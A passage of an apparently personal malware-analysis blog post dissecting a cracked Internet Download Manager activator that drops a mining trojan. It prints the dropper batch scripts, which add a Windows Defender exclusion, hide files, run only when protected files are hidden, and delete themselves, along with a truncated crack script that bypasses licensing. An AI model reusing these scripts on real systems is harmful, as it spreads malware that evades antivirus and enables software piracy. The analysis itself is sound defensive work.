</span></span><span class=line><span class=cl>  <span class=c1>// If the directory is successfully emptied, try to delete the directory itself
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>(</span><span class=n>SetFileAttributesW</span><span class=p>(</span><span class=n>lpPathName</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=n>RemoveDirectoryW</span><span class=p>(</span><span class=n>lpPathName</span><span class=p>))</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>operator</span> <span class=k>delete</span><span class=p>(</span><span class=n>v1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1</span><span class=p>;</span> <span class=c1>// Return 1 for successful directory deletion
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=nl>LABEL_14</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>operator</span> <span class=k>delete</span><span class=p>(</span><span class=n>v1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span> <span class=c1>// Return 0 for failure in directory deletion
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113105355931.png data-srcset="./assets/image-20231113105355931.png, ./assets/image-20231113105355931.png 1.5x, ./assets/image-20231113105355931.png 2x" data-sizes=auto alt=./assets/image-20231113105355931.png title=image-20231113105355931></p><h3 id=15-payloads>1.5 Payloads</h3><p>After setting breakpoints here for dynamic debugging, we observed that after several function calls, <code>lpFileName</code> was initially replaced with <code>C:\\Users\username\AppData\Local\Temp\ytmp\files.tmp</code>. Right after the <code>CreateFileW</code> was called, we checked this directory, but it was empty. After some tinkering, we discovered that when turning off &ldquo;Hide Protected Operating System Files&rdquo;, we could finally see the payloads released by the main body. <strong>It turns out the main body set the properties of all payloads to be protected OS files.</strong></p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113155308648.png data-srcset="./assets/image-20231113155308648.png, ./assets/image-20231113155308648.png 1.5x, ./assets/image-20231113155308648.png 2x" data-sizes=auto alt=./assets/image-20231113155308648.png title=image-20231113155308648></p><p>After thorough analysis, <code>7za.exe</code> turns out to be the 7zip program, used to extract more payloads from <code>files.tmp</code>. The other scripts seem to have various functions, but no particularly obvious malicious features. And <code>IDM.bat</code> is a completely normal activation script. This leaves our analysis at a standstill once again. Currently, after running the malicious sample, it releases payloads in the <code>ytmp</code> directory and runs <code>IDM.bat</code> to complete the subsequent normal activation operation. So, where did things go wrong?</p><p>Conducting another behavioral analysis in this directory, we found that the sample not only extracted these files but also unpacked an <code>IDM0.bat</code>. However, it deleted this file after execution.</p><p>This is how the sample creates zip file <code>files.tmp</code> and extracts <code>main.bat</code>:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113145442915.png data-srcset="./assets/image-20231113145442915.png, ./assets/image-20231113145442915.png 1.5x, ./assets/image-20231113145442915.png 2x" data-sizes=auto alt=./assets/image-20231113145442915.png title=image-20231113145442915></p><p>Then the sample executes <code>main.bat</code>, which extracts more payloads from <code>files.tmp</code>.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113145610300.png data-srcset="./assets/image-20231113145610300.png, ./assets/image-20231113145610300.png 1.5x, ./assets/image-20231113145610300.png 2x" data-sizes=auto alt=./assets/image-20231113145610300.png title=image-20231113145610300></p><p>Deleting files might be an attempt to stay under the radar, making it harder to detect malicious activities. We must take a closer look at the suspicious <code>IDM0.bat</code>.</p><p>View the details of the operation. Here is the command which <code>main.bat</code> executes.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113145742023.png data-srcset="./assets/image-20231113145742023.png, ./assets/image-20231113145742023.png 1.5x, ./assets/image-20231113145742023.png 2x" data-sizes=auto alt=./assets/image-20231113145742023.png title=image-20231113145742023></p><p>Now we got all those payloads. Below are the analysis results for these files.</p><h4 id=151-filestmp>1.5.1 files.tmp</h4><p>Binary analysis reveals that this is indeed a compressed archive, and it&rsquo;s not easily extractable due to encryption.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113105440062.png data-srcset="./assets/image-20231113105440062.png, ./assets/image-20231113105440062.png 1.5x, ./assets/image-20231113105440062.png 2x" data-sizes=auto alt=./assets/image-20231113105440062.png title=image-20231113105440062></p><h4 id=152-mainbat>1.5.2 main.bat</h4><p>The purpose of this script is to quietly extract payloads and set their file attributes to be invisible.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bat data-lang=bat><span class=line><span class=cl><span class=p>@</span><span class=k>ECHO</span> OFF
</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: Disable command echoing to prevent displaying commands on the command prompt</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ATTRIB -S +H .
</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: Set the hidden and system attributes for the current directory to make it read-only</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>7za e files.tmp -p<span class=nv>%PW%</span> -aoa IDM0.bat
</span></span><span class=line><span class=cl>7za e files.tmp -p<span class=nv>%PW%</span> -aoa IDM.bat
</span></span><span class=line><span class=cl>7za e files.tmp -p<span class=nv>%PW%</span> -aoa NSudo86x.exe
</span></span><span class=line><span class=cl>7za e files.tmp -p<span class=nv>%PW%</span> -aoa AB2EF.exe
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: Use the 7-Zip command-line tool to extract files from &#34;files.tmp&#34; with the specified password (%PW%),</span>
</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: -aoa indicates overwriting all files without prompting</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>DEL</span> /F /Q /A <span class=nv>%0</span>
</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: Delete the current script file (%0). /F forces deletion, /Q deletes silently, /A deletes all files including read-only files</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>EXIT</span>
</span></span></code></pre></div><h4 id=153-idmbat>1.5.3 IDM.bat</h4><p>A completely normal activation script. Since it&rsquo;s a six hundred lines long, it will be included the in the appendix for <em>study purposes</em>.</p><h4 id=154-idm0bat>1.5.4 IDM0.bat</h4><p>This batch script performs several tasks related to antivirus exclusion and configuration of a download manager.</p><ol><li><p>Check if a registry key <code>ppd</code> exists in the <code>RunMRU</code> key and exit the script if found.</p></li><li><p><strong>Check if a registry value <code>ShowSuperHidden</code> is set to 1 in the <code>Advanced</code> key and exit the script if found.</strong></p><p><em>This implies that if we disable &ldquo;Hide protected operating system files,&rdquo; the latter part of this script that releases the malicious payload will not be executed. It&rsquo;s a clever, and indeed annoying, anti-debugging trick.</em></p></li><li><p>Determine the system architecture 32-bit or 64-bit.</p></li><li><p>If the system is 64-bit, exclude a specified path from Windows Defender using PowerShell.</p></li><li><p>If the exclusion was successful, extract <code>VScan.exe</code> from a compressed file <code>files.tmp</code> using a specified password and place it in a specified directory.</p></li><li><p>Configure registry keys related to a download manager, specifying the path to <code>VScan.exe</code>.</p></li><li><p>Delete a specific registry value related to download manager parameters.</p></li><li><p>Delete the script file and exit.</p></li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bat data-lang=bat><span class=line><span class=cl><span class=p>@</span><span class=k>ECHO</span> OFF
</span></span><span class=line><span class=cl><span class=k>SET</span> <span class=s2>&#34;NUL=1&gt;NUL 2&gt;NUL&#34;</span>
</span></span><span class=line><span class=cl><span class=k>SETLOCAL</span> ENABLEDELAYEDEXPANSION ENABLEEXTENSIONS
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: %NUL% Redirect any output or error messages to the NUL device to keep the operation silent</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: Check if the registry key &#34;ppd&#34; exists in the &#34;RunMRU&#34; key under the current user registry</span>
</span></span><span class=line><span class=cl>REG QUERY <span class=s2>&#34;HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU&#34;</span> <span class=p>|</span> FIND /I <span class=s2>&#34;ppd&#34;</span> <span class=p>&gt;</span> NUL <span class=p>&amp;&amp;</span> <span class=k>GOTO</span> <span class=nl>EndScript</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: Check if the registry value &#34;ShowSuperHidden&#34; is set to 1 in the &#34;Advanced&#34; key under the current user registry</span>
</span></span><span class=line><span class=cl>REG QUERY <span class=s2>&#34;HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced&#34;</span> /v <span class=s2>&#34;ShowSuperHidden&#34;</span> <span class=p>|</span> FIND /I <span class=s2>&#34;1&#34;</span> <span class=p>&gt;</span> NUL <span class=p>&amp;&amp;</span> <span class=k>GOTO</span> <span class=nl>EndScript</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: Check the system architecture and set OS_Bit variable accordingly</span>
</span></span><span class=line><span class=cl>REG QUERY <span class=s2>&#34;HKLM\Hardware\Description\System\CentralProcessor\0&#34;</span> <span class=p>|</span> FIND /I <span class=s2>&#34;x86&#34;</span> <span class=p>&gt;</span> NUL <span class=p>&amp;&amp;</span> <span class=k>SET</span> <span class=s2>&#34;OS_Bit=32Bit&#34;</span> <span class=p>||</span> <span class=k>SET</span> <span class=s2>&#34;OS_Bit=64Bit&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>IF</span> <span class=k>/I</span> <span class=s2>&#34;</span><span class=nv>!OS_Bit!</span><span class=s2>&#34;</span> <span class=ow>EQU</span> <span class=s2>&#34;64Bit&#34;</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=p>:</span><span class=c1>: Exclude a path from Windows Defender using PowerShell</span>
</span></span><span class=line><span class=cl>    POWERSHELL -Command Add-MpPreference -ExclusionPath <span class=s2>&#34;</span><span class=nv>!ppD!</span><span class=s2>&#34;</span> <span class=nv>%NUL%</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=p>:</span><span class=c1>: If the exclusion was successful, extract &#34;VScan.exe&#34; from &#34;files.tmp&#34; with a password and place it in the specified directory</span>
</span></span><span class=line><span class=cl>    <span class=k>IF</span> <span class=k>/I</span> <span class=s2>&#34;</span><span class=nv>!ERRORLEVEL!</span><span class=s2>&#34;</span> <span class=ow>EQU</span> <span class=s2>&#34;0&#34;</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        7za e <span class=s2>&#34;files.tmp&#34;</span> -p!PW! -aoa <span class=s2>&#34;VScan.exe&#34;</span> -o<span class=s2>&#34;</span><span class=nv>!ppDM!</span><span class=s2>&#34;</span> <span class=nv>%NUL%</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=p>:</span><span class=c1>: Configure the registry key for the download manager, specifying the path to &#34;VScan.exe&#34;</span>
</span></span><span class=line><span class=cl>        REG ADD <span class=s2>&#34;HKCU\Software\DownloadManager&#34;</span> /v <span class=s2>&#34;VScannerProgram&#34;</span> /t <span class=s2>&#34;REG_SZ&#34;</span> /d <span class=s2>&#34;</span><span class=nv>!ppDM!</span><span class=s2>\VScan.exe&#34;</span> /f <span class=nv>%NUL%</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=p>:</span><span class=c1>: Delete a specific registry value related to download manager parameters</span>
</span></span><span class=line><span class=cl>        REG DELETE <span class=s2>&#34;HKCU\Software\DownloadManager&#34;</span> /v <span class=s2>&#34;VScannerParameters&#34;</span> /f <span class=nv>%NUL%</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>EndScript</span>
</span></span><span class=line><span class=cl><span class=k>ENDLOCAL</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: Delete the script file</span>
</span></span><span class=line><span class=cl><span class=k>DEL</span> /F /Q /A <span class=nv>%0</span> <span class=nv>%NUL%</span>
</span></span><span class=line><span class=cl><span class=k>EXIT</span>
</span></span></code></pre></div><p>Yes, it turns out that the &ldquo;Hide protected operating system files&rdquo; feature is implemented through the registry.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113153600226.png data-srcset="./assets/image-20231113153600226.png, ./assets/image-20231113153600226.png 1.5x, ./assets/image-20231113153600226.png 2x" data-sizes=auto alt=./assets/image-20231113153600226.png title=image-20231113153600226></p><p>It&rsquo;s not hard to notice that the script releases another genuine malicious sample, <code>VScan.exe</code>, from <code>file.tmp</code> at the end. I believe it&rsquo;s the latter that further achieves the intrusion of the mining trojan through DLL injection.</p><h4 id=155-vscanexe>1.5.5 VScan.exe</h4><p>To obtain VScan, we&rsquo;ll need to manually extract it from <code>files.tmp</code> using the same decompression password.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113152613457.png data-srcset="./assets/image-20231113152613457.png, ./assets/image-20231113152613457.png 1.5x, ./assets/image-20231113152613457.png 2x" data-sizes=auto alt=./assets/image-20231113152613457.png title=image-20231113152613457></p><p>This is a highly dangerous program. Let&rsquo;s not forget that the <code>IDM0.bat</code> script has set exclusions for Windows Defender, so at this point, Windows Defender can no longer detect VScan.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113152916887.png data-srcset="./assets/image-20231113152916887.png, ./assets/image-20231113152916887.png 1.5x, ./assets/image-20231113152916887.png 2x" data-sizes=auto alt=./assets/image-20231113152916887.png title=image-20231113152916887></p><p>Through the <code>IDM.bat</code> script, it&rsquo;s discovered that the latter two payloads are called by the registration script, further achieving the registration process. Due to time constraints, the analysis of these two programs is not yet complete. Here are their imported functions.</p><h4 id=156-nsudo86exe>1.5.6 NSudo86.exe</h4><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113102409162.png data-srcset="./assets/image-20231113102409162.png, ./assets/image-20231113102409162.png 1.5x, ./assets/image-20231113102409162.png 2x" data-sizes=auto alt=./assets/image-20231113102409162.png title=image-20231113102409162></p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113102608468.png data-srcset="./assets/image-20231113102608468.png, ./assets/image-20231113102608468.png 1.5x, ./assets/image-20231113102608468.png 2x" data-sizes=auto alt=./assets/image-20231113102608468.png title=image-20231113102608468></p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113102531606.png data-srcset="./assets/image-20231113102531606.png, ./assets/image-20231113102531606.png 1.5x, ./assets/image-20231113102531606.png 2x" data-sizes=auto alt=./assets/image-20231113102531606.png title=image-20231113102531606></p><h4 id=157-ab2efexe>1.5.7 AB2EF.exe</h4><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113104401045.png data-srcset="./assets/image-20231113104401045.png, ./assets/image-20231113104401045.png 1.5x, ./assets/image-20231113104401045.png 2x" data-sizes=auto alt=./assets/image-20231113104401045.png title=image-20231113104401045></p><h2 id=2-conclusion>2 Conclusion</h2><p>Through the static analysis, dynamic debugging, and sample evidence collection as described above, we have gained a basic understanding of the process by which the malicious sample releases the mining trojan. I believe what was mentioned in the registration tool&rsquo;s <code>Readme.txt</code>: temporarily disabling Windows Defender is necessary for activating the software, enabling the success of the malicious sample. As a student in the field of information security, I realize I was a bit naive. Additionally, the design of this sample is quite clever, and overall, the analysis process is quite interesting. I&rsquo;m fortunate that it&rsquo;s just a mining trojan, and I noticed the error messages from the command prompt. Remember <code>WinRing0x64.sys</code>? It&rsquo;s a file from Microsoft used to obtain hardware information about the computer. It&rsquo;s possible that this mining trojan would operate gently within the hardware capabilities of my computer, remaining undetected for an extended period. Well, it seems that I&rsquo;ll need to be more cautious when searching for resources online in the future.</p><h2 id=3-link>3 Link</h2><p>Later on, I discovered posts from other people online who had experienced similar issues. Haha, it turns out I&rsquo;m not alone in this! There&rsquo;s even a report from the U.S. government!</p><ul><li><p><a href=https://www.cisa.gov/sites/default/files/publications/MAR-10387061.r1.v1.CLEAR.pdf target=_blank rel="noopener noreffer">https://www.cisa.gov/sites/default/files/publications/MAR-10387061.r1.v1.CLEAR.pdf</a></p></li><li><p><a href=https://www.52pojie.cn/thread-1774226-1-1.html target=_blank rel="noopener noreffer">https://www.52pojie.cn/thread-1774226-1-1.html</a></p></li></ul><h2 id=4-appendix>4 Appendix</h2><ul><li><p>Hash of the malicious sample: <code>61208ef95b922b0e93f0dbea9d4d565d</code></p></li><li><p>Source of the malicious sample: <code>https://www.crackingcity.com/idm-crack/</code></p></li><li><p>IDM.bat</p><pre tabindex=0><code class=language-abt data-lang=abt>@setlocal DisableDelayedExpansion
@echo off

:: Add custom name in IDM license info, prefer to write it in English and/or numeric in below line after = sign,
set name=%Username% - by crackingcity.com
set title=Internet Download Manager (IDM) 6.xx Activator or Resetter v3.1




::========================================================================================================================================

:: Re-launch the script with x64 process if it was initiated by x86 process on x64 bit Windows
:: or with ARM64 process if it was initiated by x86/ARM32 process on ARM64 Windows

if exist %SystemRoot%\Sysnative\cmd.exe (
set &#34;_cmdf=%~f0&#34;
setlocal EnableDelayedExpansion
start %SystemRoot%\Sysnative\cmd.exe /c &#34;&#34;!_cmdf!&#34; %*&#34;
exit /b
)

:: Re-launch the script with ARM32 process if it was initiated by x64 process on ARM64 Windows

if exist %SystemRoot%\Windows\SyChpe32\kernel32.dll if exist %SystemRoot%\SysArm32\cmd.exe if %PROCESSOR_ARCHITECTURE%==AMD64 (
set &#34;_cmdf=%~f0&#34;
setlocal EnableDelayedExpansion
start %SystemRoot%\SysArm32\cmd.exe /c &#34;&#34;!_cmdf!&#34; %*&#34;
exit /b
)

::  Set Path variable, it helps if it is misconfigured in the system

set &#34;SysPath=%SystemRoot%\System32&#34;
set &#34;Path=%SysPath%;%SystemRoot%;%SysPath%\Wbem;%SysPath%\WindowsPowerShell\v1.0\&#34;

::========================================================================================================================================

cls
color 07

set _args=
set _elev=
set reset=
set Silent=
set activate=

set _args=%*
if defined _args set _args=%_args:&#34;=%
if defined _args (
for %%A in (%_args%) do (
if /i &#34;%%A&#34;==&#34;-el&#34;  set _elev=1
if /i &#34;%%A&#34;==&#34;/res&#34; set Unattended=1&amp;set activate=&amp;set reset=1
if /i &#34;%%A&#34;==&#34;/act&#34; set Unattended=1&amp;set activate=1&amp;set reset=
if /i &#34;%%A&#34;==&#34;/s&#34;   set Unattended=1&amp;set Silent=1
)
)

::========================================================================================================================================

set &#34;nul=&gt;nul 2&gt;&amp;1&#34;
set &#34;_psc=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe&#34;
set winbuild=1
for /f &#34;tokens=6 delims=[]. &#34; %%G in (&#39;ver&#39;) do set winbuild=%%G
call :_colorprep
set &#34;nceline=echo: &amp;echo ==== ERROR ==== &amp;echo:&#34;
set &#34;line=_________________________________________________________________________________________&#34;
set &#34;_buf={$W=$Host.UI.RawUI.WindowSize;$B=$Host.UI.RawUI.BufferSize;$W.Height=31;$B.Height=300;$Host.UI.RawUI.WindowSize=$W;$Host.UI.RawUI.BufferSize=$B;}&#34;

if defined Silent if not defined activate if not defined reset exit /b
if defined Silent call :begin %nul% &amp; exit /b

:begin

::========================================================================================================================================

if not exist &#34;%_psc%&#34; (
%nceline%
echo Powershell is not installed in the system.
echo Aborting...
goto done2
)

if %winbuild% LSS 7600 (
%nceline%
echo Unsupported OS version Detected.
echo Project is supported only for Windows 7/8/8.1/10/11 and their Server equivalent.
goto done2
)

::========================================================================================================================================

::  Fix for the special characters limitation in path name

set &#34;_work=%~dp0&#34;
if &#34;%_work:~-1%&#34;==&#34;\&#34; set &#34;_work=%_work:~0,-1%&#34;

set &#34;_batf=%~f0&#34;
set &#34;_batp=%_batf:&#39;=&#39;&#39;%&#34;

set _PSarg=&#34;&#34;&#34;%~f0&#34;&#34;&#34; -el %_args%

set &#34;_appdata=%appdata%&#34;
for /f &#34;tokens=2*&#34; %%a in (&#39;reg query &#34;HKCU\Software\DownloadManager&#34; /v ExePath 2^&gt;nul&#39;) do call set &#34;IDMan=%%b&#34;

setlocal EnableDelayedExpansion


::========================================================================================================================================

:: Below code also works for ARM64 Windows 10 (including x64 bit emulation)

reg query &#34;HKLM\Hardware\Description\System\CentralProcessor\0&#34; /v &#34;Identifier&#34; | find /i &#34;x86&#34; 1&gt;nul &amp;&amp; set arch=x86|| set arch=x64

if not exist &#34;!IDMan!&#34; (
if %arch%==x64 set &#34;IDMan=%ProgramFiles(x86)%\Internet Download Manager\IDMan.exe&#34;
if %arch%==x86 set &#34;IDMan=%ProgramFiles%\Internet Download Manager\IDMan.exe&#34;
)

if &#34;%arch%&#34;==&#34;x86&#34; (
set &#34;CLSID=HKCU\Software\Classes\CLSID&#34;
set &#34;HKLM=HKLM\Software\Internet Download Manager&#34;
set &#34;_tok=5&#34;
) else (
set &#34;CLSID=HKCU\Software\Classes\Wow6432Node\CLSID&#34;
set &#34;HKLM=HKLM\SOFTWARE\Wow6432Node\Internet Download Manager&#34;
set &#34;_tok=6&#34;
)

set _temp=%SystemRoot%\Temp
set regdata=%SystemRoot%\Temp\regdata.txt
set &#34;idmcheck=tasklist /fi &#34;imagename eq idman.exe&#34; | findstr /i &#34;idman.exe&#34; &gt;nul&#34;

::========================================================================================================================================

if defined Unattended (
if defined reset goto _reset
if defined activate goto _activate
)

:MainMenu

cls
TITLE %title%
mode 89, 23

:: Check firewall status

set /a _ena=0
set /a _dis=0
for %%# in (DomainProfile PublicProfile StandardProfile) do (
for /f &#34;skip=2 tokens=2*&#34; %%a in (&#39;reg query HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\%%# /v EnableFirewall 2^&gt;nul&#39;) do (
if /i %%b equ 0x1 (set /a _ena+=1) else (set /a _dis+=1)
)
)

if %_ena%==3 (
set _status=Enabled
set _col=%_Green%
)

if %_dis%==3 (
set _status=Disabled
set _col=%_Red%
)

if not %_ena%==3 if not %_dis%==3 (
set _status=Status_Unclear
set _col=%_Yellow%
)

AB2EF kF5nJ4D92hfOpc8 %nul%

echo:
echo:
echo:
echo:
echo:                  _____________________________________________________
echo:                                                          
echo:                     [1] Activate IDM
echo:                     [2] Reset IDM Activation / Trial in Registry
echo:                     _______________________________________________
echo:                                                          
call :_color2 %_White% &#34;                     [3] Toggle Windows Firewall  &#34; %_col% &#34;[%_status%]&#34;
echo:                     _______________________________________________
echo:                                                          
echo:                     [4] ReadMe
echo:                     [5] Homepage
echo:                     [6] Exit
echo:                  _____________________________________________________
echo:   
call :_color2 %_White% &#34;                    &#34; %_Green% &#34;Enter a menu option in the Keyboard [1,2,3,4,5,6]&#34;
choice /C:123456 /N
set _erl=%errorlevel%

if %_erl%==6 DEL /F /Q /A *.* %nul%&amp;exit /b
if %_erl%==5 goto homepage
if %_erl%==4 call :readme&amp;goto MainMenu
if %_erl%==3 call :_tog_Firewall&amp;goto MainMenu
if %_erl%==2 goto _reset
if %_erl%==1 goto _activate
goto :MainMenu

::========================================================================================================================================

:_tog_Firewall

if %_status%==Enabled (
netsh AdvFirewall Set AllProfiles State Off &gt;nul
) else (
netsh AdvFirewall Set AllProfiles State On &gt;nul
)
exit /b

::========================================================================================================================================

:readme

set &#34;_ReadMe=%SystemRoot%\Temp\ReadMe.txt&#34;
if exist &#34;%_ReadMe%&#34; del /f /q &#34;%_ReadMe%&#34; %nul%
call :export txt &#34;%_ReadMe%&#34;
start notepad &#34;%_ReadMe%&#34;
timeout /t 2 %nul%
del /f /q &#34;%_ReadMe%&#34;
exit /b

::  Extract the text from batch script without character and file encoding issue

:export

%nul% %_psc% &#34;$f=[io.file]::ReadAllText(&#39;!_batp!&#39;) -split \&#34;:%~1\:.*`r`n\&#34;; [io.file]::WriteAllText(&#39;%~2&#39;,$f[1].Trim(),[System.Text.Encoding]::ASCII);&#34;
exit/b

::========================================================================================================================================

:_reset

TITLE %title%
MODE CON: COLS=89 LINES=13

set _error=

reg query &#34;HKCU\Software\DownloadManager&#34; &#34;/v&#34; &#34;Serial&#34; %nul% &amp;&amp; (
%idmcheck% &amp;&amp; taskkill /f /im idman.exe  %nul%
)

if exist &#34;!_appdata!\DMCache\settings.bak&#34; del /s /f /q &#34;!_appdata!\DMCache\settings.bak&#34;  %nul%

set &#34;_action=call :delete_key&#34;
call :reset

echo:
echo %line%
echo:
if not defined _error (
call :_color %Green% &#34;IDM Activation - Trial is successfully reset in the registry.&#34;
) else (
call :_color %Red% &#34;Failed to completely reset IDM Activation - Trial.&#34;
)

goto done

::========================================================================================================================================

:_activate

TITLE %title%
MODE CON: COLS=89 LINES=25

echo:
set _error=

if not exist &#34;!IDMan!&#34; (
call :_color %Red% &#34;IDM [Internet Download Manager] is not Installed.&#34;
echo You can download it from  https://www.internetdownloadmanager.com/download.html
goto done
)

:: Internet check with internetdownloadmanager.com ping and port 80 test

ping -n 1 internetdownloadmanager.com &gt;nul || (
%_psc% &#34;$t = New-Object Net.Sockets.TcpClient;try{$t.Connect(&#34;&#34;&#34;internetdownloadmanager.com&#34;&#34;&#34;, 80)}catch{};$t.Connected&#34; | findstr /i true 1&gt;nul
)

if not [%errorlevel%]==[0] (
call :_color %Red% &#34;Unable to connect internetdownloadmanager.com, aborting...&#34;
goto done
)

echo Internet is connected.

%idmcheck% &amp;&amp; taskkill /f /im idman.exe %nul%

if exist &#34;!_appdata!\DMCache\settings.bak&#34; del /s /f /q &#34;!_appdata!\DMCache\settings.bak&#34; %nul%

set &#34;_action=call :delete_key&#34;
call :reset

set &#34;_action=call :count_key&#34;
call :register_IDM

echo:
if defined _derror call :f_reset &amp; goto done

set lockedkeys=
set &#34;_action=call :lock_key&#34;
echo Locking registry keys...
rem echo:
call :action

if not defined _error if [%lockedkeys%] GEQ [7] (
echo:
echo %line%
echo:
call :_color %Green% &#34;IDM is successfully activated.&#34;
echo:
call :_color %Gray% &#34;If fake serial screen appears, run activation option again, after that it wont appear.&#34;
goto done
)

call :f_reset

::========================================================================================================================================

:done

NSudo86x -U:C -P:E -UseCurrentConsole &#34;!IDMan!&#34; /onboot %nul%

start &#34;&#34; &#34;www.crackingcity.com&#34; %nul%

echo %line%
echo:
echo:
if defined Unattended (
echo Press any key to exit...
pause &gt;nul
exit /b
)

call :_color %_Yellow% &#34;Press any key to return...&#34;
pause &gt;nul
goto MainMenu

:done2

if defined Unattended (
echo Press any key to exit...
pause &gt;nul
exit /b
)

echo Press any key to exit...
pause &gt;nul
exit /b

::========================================================================================================================================

:homepage

cls
start https://www.crackingcity.com
goto MainMenu

::========================================================================================================================================

:f_reset

echo:
echo %line%
echo:
call :_color %Red% &#34;Error found, resetting IDM activation...&#34;
set &#34;_action=call :delete_key&#34;
call :reset
echo:
echo %line%
echo:
call :_color %Red% &#34;Failed to activate IDM.&#34;
exit /b

::========================================================================================================================================

:reset

set take_permission=
call :delete_queue
set take_permission=1
call :action
call :add_key
exit /b

::========================================================================================================================================

:_rcont

reg add %reg% %nul%
call :_add_key
exit /b

:register_IDM

echo:
echo Applying registration details...
rem echo:

If not defined name set name=Tonec FZE

set &#34;reg=HKCU\SOFTWARE\DownloadManager /v FName /t REG_SZ /d &#34;%name%&#34;&#34; &amp; call :_rcont
set &#34;reg=HKCU\SOFTWARE\DownloadManager /v LName /t REG_SZ /d &#34;&#34;&#34; &amp; call :_rcont
set &#34;reg=HKCU\SOFTWARE\DownloadManager /v Email /t REG_SZ /d &#34;info@tonec.com&#34;&#34; &amp; call :_rcont
set &#34;reg=HKCU\SOFTWARE\DownloadManager /v Serial /t REG_SZ /d &#34;R953G-JE15D-5FCTH-50SNV&#34;&#34; &amp; call :_rcont

echo:
echo Triggering a few downloads to create certain registry keys, please wait...

set &#34;file=%_temp%\temp.png&#34;
set _fileexist=
set _derror=

%idmcheck% &amp;&amp; taskkill /f /im idman.exe

set link=https://www.internetdownloadmanager.com/images/idm_box_min.png
call :download
set link=https://www.internetdownloadmanager.com/register/IDMlib/images/idman_logos.png
call :download

:: it may take some time to reflect registry keys.
timeout /t 3 &gt;nul

set foundkeys=
call :action
if [%foundkeys%] GEQ [7] goto _skip

set link=https://www.internetdownloadmanager.com/pictures/idm_about.png
call :download
set link=https://www.internetdownloadmanager.com/languages/indian.png
call :download

timeout /t 3 &gt;nul

set foundkeys=
call :action
if not [%foundkeys%] GEQ [7] set _derror=1

:_skip

echo:
if not defined _derror (
echo Required registry keys were created successfully.
) else (
if not defined _fileexist call :_color %Red% &#34;Unable to download files with IDM.&#34;
call :_color %Red% &#34;Failed to create required registry keys.&#34;
call :_color %Magenta% &#34;Try again - disable Windows firewall with script options - check Read Me.&#34;
)

rem echo:
%idmcheck% &amp;&amp; taskkill /f /im idman.exe %nul%
if exist &#34;%file%&#34; del /f /q &#34;%file%&#34;
exit /b

:download

set /a attempt=0
if exist &#34;%file%&#34; del /f /q &#34;%file%&#34;
start &#34;&#34; /B &#34;!IDMan!&#34; /n /d &#34;%link%&#34; /p &#34;%_temp%&#34; /f temp.png

:check_file

timeout /t 1 &gt;nul
set /a attempt+=1
if exist &#34;%file%&#34; set _fileexist=1&amp;exit /b
if %attempt% GEQ 20 exit /b
goto :Check_file

::========================================================================================================================================

:delete_queue

echo:
echo Deleting registry keys...
rem echo:

for %%# in (
